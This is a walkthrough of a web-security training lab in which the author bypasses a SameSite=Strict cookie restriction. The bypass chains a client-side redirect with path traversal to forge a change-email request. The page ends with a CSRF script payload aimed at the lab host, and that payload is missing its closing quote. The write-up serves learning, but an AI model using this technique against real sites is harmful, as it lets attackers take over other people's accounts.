# SameSite Strict bypass via client-side redirect

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e634db50-9ad5-48ed-8357-fe079046d56f/2024-02-22_19-57.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HWAV2U6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210330Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FIMK7rEeVM1CLxwwT3mwDX0b7gwUO18vPY1i5ek6kIgIhAMbW9yauzwhVar08a8n4wSbhvXWSmdl1PkOkuHXFFUjCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwxhxdfrdPIvCeZNoQq3AMrz0RdjQWJ8kMhHnQhTCa0uyk8xK6xiXlDEuHFyij%2BWFJ9h5HPhxBwzTuaKdNfzpejsu7og0wxzReooZcl%2Brin7gAVChF%2FwNqyNW16WJXHrZHU5alu3vzw%2F2%2FtLfi4%2B%2BxVk0BxYJ4AyxCYm4PypQxEOEbFxvAcWerJEWONb4wK9X8u9kY7Re2b%2FoSpvKJ4g%2BL54Q1mXSFfgvtLXeBsrU3AqZeKWSyrUOcrgHWkXbmMrpNc77XD79NczPLIdnBsJIkgXpvnSuDRnFac0dpolrJpKqDnCUg1qfVHUZcUqBV5RAoFpovdGaUoKPoIybo4Pf73UN0PDaTHp75wt8mKd5LlJujce%2FKJp3TqDpLNGKCsUFUgpmF7CFPKyMM7xW%2FyGmTjFaSKK0cDEbZWnn7bdbPs8t00tTmzDUFSu2n%2B2nOxPiFI041FeByiJXRMEOeZC8EKWXa0%2FESgWx1A4B%2F47J%2F8Y5OTVxA6EiqlVO0LkCPN5879JILBQl3138kRvEQ7EaefCyjVTZGyK06g5J0gQa0PiuviMSWBn4fONWX01uIIA2uWMzhHc2iD%2FHIYIe4g%2F0AXx7MFA%2BVWrTtsD6%2F%2FE%2Fhnr%2Ffft7fOWiDe0VleDv1qEyQPvQa9iluVNN933jD%2BxaLUBjqkAS8MvWFWND2FyLyYesMnbS8fZ0dSAcw42dxjSJioQvNtN7QRenaXNB60zT2l9gPGva5oRrewSPhXEUyC8R2U72SCkSDUK75bg%2B95jDSLMydZyFnx8%2B1lBxyRUBAwdhxf8%2F2bRbGAT8SXB7NgOMkRd8QpVcxHQaUh7tVbjYqHi1W2hvX13g%2BDxa4oLNiN1aYpwA1jAyhImW55m1N7jpVQs%2Be%2Frzn8&X-Amz-Signature=3e0e314061a3e824591db1c11cfd5f06b93df976163bf513d424a6712350e763&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

it’ll set a new session cookie for us: we can see there is a `SameSite` attribute, which is set to `Strict` restriction.

**Inspect the change-email request **

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/bb6cd652-6676-475b-8f9a-32fed3dd743a/2024-02-22_20-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HWAV2U6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210330Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FIMK7rEeVM1CLxwwT3mwDX0b7gwUO18vPY1i5ek6kIgIhAMbW9yauzwhVar08a8n4wSbhvXWSmdl1PkOkuHXFFUjCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwxhxdfrdPIvCeZNoQq3AMrz0RdjQWJ8kMhHnQhTCa0uyk8xK6xiXlDEuHFyij%2BWFJ9h5HPhxBwzTuaKdNfzpejsu7og0wxzReooZcl%2Brin7gAVChF%2FwNqyNW16WJXHrZHU5alu3vzw%2F2%2FtLfi4%2B%2BxVk0BxYJ4AyxCYm4PypQxEOEbFxvAcWerJEWONb4wK9X8u9kY7Re2b%2FoSpvKJ4g%2BL54Q1mXSFfgvtLXeBsrU3AqZeKWSyrUOcrgHWkXbmMrpNc77XD79NczPLIdnBsJIkgXpvnSuDRnFac0dpolrJpKqDnCUg1qfVHUZcUqBV5RAoFpovdGaUoKPoIybo4Pf73UN0PDaTHp75wt8mKd5LlJujce%2FKJp3TqDpLNGKCsUFUgpmF7CFPKyMM7xW%2FyGmTjFaSKK0cDEbZWnn7bdbPs8t00tTmzDUFSu2n%2B2nOxPiFI041FeByiJXRMEOeZC8EKWXa0%2FESgWx1A4B%2F47J%2F8Y5OTVxA6EiqlVO0LkCPN5879JILBQl3138kRvEQ7EaefCyjVTZGyK06g5J0gQa0PiuviMSWBn4fONWX01uIIA2uWMzhHc2iD%2FHIYIe4g%2F0AXx7MFA%2BVWrTtsD6%2F%2FE%2Fhnr%2Ffft7fOWiDe0VleDv1qEyQPvQa9iluVNN933jD%2BxaLUBjqkAS8MvWFWND2FyLyYesMnbS8fZ0dSAcw42dxjSJioQvNtN7QRenaXNB60zT2l9gPGva5oRrewSPhXEUyC8R2U72SCkSDUK75bg%2B95jDSLMydZyFnx8%2B1lBxyRUBAwdhxf8%2F2bRbGAT8SXB7NgOMkRd8QpVcxHQaUh7tVbjYqHi1W2hvX13g%2BDxa4oLNiN1aYpwA1jAyhImW55m1N7jpVQs%2Be%2Frzn8&X-Amz-Signature=1be28cceac9877470103ab12914802c748f8df8bf5628ed9c40eb1fec01db3db&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

It doesn’t have a CSRF token parameter, which helps to prevent CSRF (Cross-Site Request Forgery) attack. So, it may be vulnerable to CSRF.

It send a POST request to `/my-account/change-email`, with parameter `email`, `submit`.

**Change request method to GET**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/740b8a54-220d-463a-8313-c8e9c2486ef8/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HWAV2U6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210330Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FIMK7rEeVM1CLxwwT3mwDX0b7gwUO18vPY1i5ek6kIgIhAMbW9yauzwhVar08a8n4wSbhvXWSmdl1PkOkuHXFFUjCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwxhxdfrdPIvCeZNoQq3AMrz0RdjQWJ8kMhHnQhTCa0uyk8xK6xiXlDEuHFyij%2BWFJ9h5HPhxBwzTuaKdNfzpejsu7og0wxzReooZcl%2Brin7gAVChF%2FwNqyNW16WJXHrZHU5alu3vzw%2F2%2FtLfi4%2B%2BxVk0BxYJ4AyxCYm4PypQxEOEbFxvAcWerJEWONb4wK9X8u9kY7Re2b%2FoSpvKJ4g%2BL54Q1mXSFfgvtLXeBsrU3AqZeKWSyrUOcrgHWkXbmMrpNc77XD79NczPLIdnBsJIkgXpvnSuDRnFac0dpolrJpKqDnCUg1qfVHUZcUqBV5RAoFpovdGaUoKPoIybo4Pf73UN0PDaTHp75wt8mKd5LlJujce%2FKJp3TqDpLNGKCsUFUgpmF7CFPKyMM7xW%2FyGmTjFaSKK0cDEbZWnn7bdbPs8t00tTmzDUFSu2n%2B2nOxPiFI041FeByiJXRMEOeZC8EKWXa0%2FESgWx1A4B%2F47J%2F8Y5OTVxA6EiqlVO0LkCPN5879JILBQl3138kRvEQ7EaefCyjVTZGyK06g5J0gQa0PiuviMSWBn4fONWX01uIIA2uWMzhHc2iD%2FHIYIe4g%2F0AXx7MFA%2BVWrTtsD6%2F%2FE%2Fhnr%2Ffft7fOWiDe0VleDv1qEyQPvQa9iluVNN933jD%2BxaLUBjqkAS8MvWFWND2FyLyYesMnbS8fZ0dSAcw42dxjSJioQvNtN7QRenaXNB60zT2l9gPGva5oRrewSPhXEUyC8R2U72SCkSDUK75bg%2B95jDSLMydZyFnx8%2B1lBxyRUBAwdhxf8%2F2bRbGAT8SXB7NgOMkRd8QpVcxHQaUh7tVbjYqHi1W2hvX13g%2BDxa4oLNiN1aYpwA1jAyhImW55m1N7jpVQs%2Be%2Frzn8&X-Amz-Signature=4ac1279e0bea811531431238340be8fba13543a13a9ac2f85d16a7205da36d1f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

It accepts the GET method too


However, in order to exploit CSRF, we first have to **bypass the **`SameSite=Strict`** restriction.**

> 💡 **Strict restriction:**

If a cookie is set with the `SameSite=Strict `attribute, browsers won’t include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

As far as browsers are concerned, these client-side redirects aren’t really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.

If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.

**Find & Understand the Client Side Redirect**

In the home page, we can view different posts And we can leave some comments.

Let’s leave a test comment:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/62aa176a-6c07-414a-99c8-2dbe3de596c9/2024-02-23_00-31.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HWAV2U6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210330Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FIMK7rEeVM1CLxwwT3mwDX0b7gwUO18vPY1i5ek6kIgIhAMbW9yauzwhVar08a8n4wSbhvXWSmdl1PkOkuHXFFUjCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwxhxdfrdPIvCeZNoQq3AMrz0RdjQWJ8kMhHnQhTCa0uyk8xK6xiXlDEuHFyij%2BWFJ9h5HPhxBwzTuaKdNfzpejsu7og0wxzReooZcl%2Brin7gAVChF%2FwNqyNW16WJXHrZHU5alu3vzw%2F2%2FtLfi4%2B%2BxVk0BxYJ4AyxCYm4PypQxEOEbFxvAcWerJEWONb4wK9X8u9kY7Re2b%2FoSpvKJ4g%2BL54Q1mXSFfgvtLXeBsrU3AqZeKWSyrUOcrgHWkXbmMrpNc77XD79NczPLIdnBsJIkgXpvnSuDRnFac0dpolrJpKqDnCUg1qfVHUZcUqBV5RAoFpovdGaUoKPoIybo4Pf73UN0PDaTHp75wt8mKd5LlJujce%2FKJp3TqDpLNGKCsUFUgpmF7CFPKyMM7xW%2FyGmTjFaSKK0cDEbZWnn7bdbPs8t00tTmzDUFSu2n%2B2nOxPiFI041FeByiJXRMEOeZC8EKWXa0%2FESgWx1A4B%2F47J%2F8Y5OTVxA6EiqlVO0LkCPN5879JILBQl3138kRvEQ7EaefCyjVTZGyK06g5J0gQa0PiuviMSWBn4fONWX01uIIA2uWMzhHc2iD%2FHIYIe4g%2F0AXx7MFA%2BVWrTtsD6%2F%2FE%2Fhnr%2Ffft7fOWiDe0VleDv1qEyQPvQa9iluVNN933jD%2BxaLUBjqkAS8MvWFWND2FyLyYesMnbS8fZ0dSAcw42dxjSJioQvNtN7QRenaXNB60zT2l9gPGva5oRrewSPhXEUyC8R2U72SCkSDUK75bg%2B95jDSLMydZyFnx8%2B1lBxyRUBAwdhxf8%2F2bRbGAT8SXB7NgOMkRd8QpVcxHQaUh7tVbjYqHi1W2hvX13g%2BDxa4oLNiN1aYpwA1jAyhImW55m1N7jpVQs%2Be%2Frzn8&X-Amz-Signature=e9124c3812a1f576ed567500d294c4adffd400c02105190196fd4e7627ff645d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0893e271-ef59-4e3a-8280-b06cd6ea63d2/2024-02-22_21-23.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HWAV2U6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210330Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FIMK7rEeVM1CLxwwT3mwDX0b7gwUO18vPY1i5ek6kIgIhAMbW9yauzwhVar08a8n4wSbhvXWSmdl1PkOkuHXFFUjCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwxhxdfrdPIvCeZNoQq3AMrz0RdjQWJ8kMhHnQhTCa0uyk8xK6xiXlDEuHFyij%2BWFJ9h5HPhxBwzTuaKdNfzpejsu7og0wxzReooZcl%2Brin7gAVChF%2FwNqyNW16WJXHrZHU5alu3vzw%2F2%2FtLfi4%2B%2BxVk0BxYJ4AyxCYm4PypQxEOEbFxvAcWerJEWONb4wK9X8u9kY7Re2b%2FoSpvKJ4g%2BL54Q1mXSFfgvtLXeBsrU3AqZeKWSyrUOcrgHWkXbmMrpNc77XD79NczPLIdnBsJIkgXpvnSuDRnFac0dpolrJpKqDnCUg1qfVHUZcUqBV5RAoFpovdGaUoKPoIybo4Pf73UN0PDaTHp75wt8mKd5LlJujce%2FKJp3TqDpLNGKCsUFUgpmF7CFPKyMM7xW%2FyGmTjFaSKK0cDEbZWnn7bdbPs8t00tTmzDUFSu2n%2B2nOxPiFI041FeByiJXRMEOeZC8EKWXa0%2FESgWx1A4B%2F47J%2F8Y5OTVxA6EiqlVO0LkCPN5879JILBQl3138kRvEQ7EaefCyjVTZGyK06g5J0gQa0PiuviMSWBn4fONWX01uIIA2uWMzhHc2iD%2FHIYIe4g%2F0AXx7MFA%2BVWrTtsD6%2F%2FE%2Fhnr%2Ffft7fOWiDe0VleDv1qEyQPvQa9iluVNN933jD%2BxaLUBjqkAS8MvWFWND2FyLyYesMnbS8fZ0dSAcw42dxjSJioQvNtN7QRenaXNB60zT2l9gPGva5oRrewSPhXEUyC8R2U72SCkSDUK75bg%2B95jDSLMydZyFnx8%2B1lBxyRUBAwdhxf8%2F2bRbGAT8SXB7NgOMkRd8QpVcxHQaUh7tVbjYqHi1W2hvX13g%2BDxa4oLNiN1aYpwA1jAyhImW55m1N7jpVQs%2Be%2Frzn8&X-Amz-Signature=a412ae05dc34d10ec9ca7a20bdab52327c67244036af7b497798d43e3f3192c5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

After we send the request, it’ll fetch a JavaScript file:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/fb9ef1eb-a927-412b-96dc-23e4328e074a/2024-02-23_00-32.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HWAV2U6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210330Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FIMK7rEeVM1CLxwwT3mwDX0b7gwUO18vPY1i5ek6kIgIhAMbW9yauzwhVar08a8n4wSbhvXWSmdl1PkOkuHXFFUjCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwxhxdfrdPIvCeZNoQq3AMrz0RdjQWJ8kMhHnQhTCa0uyk8xK6xiXlDEuHFyij%2BWFJ9h5HPhxBwzTuaKdNfzpejsu7og0wxzReooZcl%2Brin7gAVChF%2FwNqyNW16WJXHrZHU5alu3vzw%2F2%2FtLfi4%2B%2BxVk0BxYJ4AyxCYm4PypQxEOEbFxvAcWerJEWONb4wK9X8u9kY7Re2b%2FoSpvKJ4g%2BL54Q1mXSFfgvtLXeBsrU3AqZeKWSyrUOcrgHWkXbmMrpNc77XD79NczPLIdnBsJIkgXpvnSuDRnFac0dpolrJpKqDnCUg1qfVHUZcUqBV5RAoFpovdGaUoKPoIybo4Pf73UN0PDaTHp75wt8mKd5LlJujce%2FKJp3TqDpLNGKCsUFUgpmF7CFPKyMM7xW%2FyGmTjFaSKK0cDEbZWnn7bdbPs8t00tTmzDUFSu2n%2B2nOxPiFI041FeByiJXRMEOeZC8EKWXa0%2FESgWx1A4B%2F47J%2F8Y5OTVxA6EiqlVO0LkCPN5879JILBQl3138kRvEQ7EaefCyjVTZGyK06g5J0gQa0PiuviMSWBn4fONWX01uIIA2uWMzhHc2iD%2FHIYIe4g%2F0AXx7MFA%2BVWrTtsD6%2F%2FE%2Fhnr%2Ffft7fOWiDe0VleDv1qEyQPvQa9iluVNN933jD%2BxaLUBjqkAS8MvWFWND2FyLyYesMnbS8fZ0dSAcw42dxjSJioQvNtN7QRenaXNB60zT2l9gPGva5oRrewSPhXEUyC8R2U72SCkSDUK75bg%2B95jDSLMydZyFnx8%2B1lBxyRUBAwdhxf8%2F2bRbGAT8SXB7NgOMkRd8QpVcxHQaUh7tVbjYqHi1W2hvX13g%2BDxa4oLNiN1aYpwA1jAyhImW55m1N7jpVQs%2Be%2Frzn8&X-Amz-Signature=3304e15cbd23415ef048dcd5474d01028263c1ec0c6b2b435f4cb3e4e94488bc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

When we go to `/post/comment/confirmation`, it’ll run that JavaScript:

- After 3 seconds, redirect user to `/post/<postId>`
![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/96991d29-353c-4165-9378-acf6cd0d9507/2024-02-22_21-25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665HWAV2U6%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210330Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FIMK7rEeVM1CLxwwT3mwDX0b7gwUO18vPY1i5ek6kIgIhAMbW9yauzwhVar08a8n4wSbhvXWSmdl1PkOkuHXFFUjCKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwxhxdfrdPIvCeZNoQq3AMrz0RdjQWJ8kMhHnQhTCa0uyk8xK6xiXlDEuHFyij%2BWFJ9h5HPhxBwzTuaKdNfzpejsu7og0wxzReooZcl%2Brin7gAVChF%2FwNqyNW16WJXHrZHU5alu3vzw%2F2%2FtLfi4%2B%2BxVk0BxYJ4AyxCYm4PypQxEOEbFxvAcWerJEWONb4wK9X8u9kY7Re2b%2FoSpvKJ4g%2BL54Q1mXSFfgvtLXeBsrU3AqZeKWSyrUOcrgHWkXbmMrpNc77XD79NczPLIdnBsJIkgXpvnSuDRnFac0dpolrJpKqDnCUg1qfVHUZcUqBV5RAoFpovdGaUoKPoIybo4Pf73UN0PDaTHp75wt8mKd5LlJujce%2FKJp3TqDpLNGKCsUFUgpmF7CFPKyMM7xW%2FyGmTjFaSKK0cDEbZWnn7bdbPs8t00tTmzDUFSu2n%2B2nOxPiFI041FeByiJXRMEOeZC8EKWXa0%2FESgWx1A4B%2F47J%2F8Y5OTVxA6EiqlVO0LkCPN5879JILBQl3138kRvEQ7EaefCyjVTZGyK06g5J0gQa0PiuviMSWBn4fONWX01uIIA2uWMzhHc2iD%2FHIYIe4g%2F0AXx7MFA%2BVWrTtsD6%2F%2FE%2Fhnr%2Ffft7fOWiDe0VleDv1qEyQPvQa9iluVNN933jD%2BxaLUBjqkAS8MvWFWND2FyLyYesMnbS8fZ0dSAcw42dxjSJioQvNtN7QRenaXNB60zT2l9gPGva5oRrewSPhXEUyC8R2U72SCkSDUK75bg%2B95jDSLMydZyFnx8%2B1lBxyRUBAwdhxf8%2F2bRbGAT8SXB7NgOMkRd8QpVcxHQaUh7tVbjYqHi1W2hvX13g%2BDxa4oLNiN1aYpwA1jAyhImW55m1N7jpVQs%2Be%2Frzn8&X-Amz-Signature=130e9993dceeca7d3875a72b8ddd56eaee080f9033ef48dd5d078e65c479a5a3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, the GET parameter `postId` is fully under attacker’s control!

**Now, what if I change the path to **`/my-account`** via path traversal?**

- Start crafting our payload
```html
/post/comment/confirmation?postId=6
```

- Change payload to redirect to my-account page
```html
/post/comment/confirmation?postId=my-account/
```

- Add a traversal attack to our payload
```html
/post/comment/confirmation?postId=../my-account/
```

- Modify payload to change our email
```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com&submit=1
```

- URL encode ampersand `&` may its not able to determine when our mail ends
```html
/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
```

- Craft out final payload
```html
<script>
window. location = "https://0ad1003704e4d04e8077d6250056008f.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test@wiener.com%26submit=1
</script>
```

- Deliver our final payload to the victim
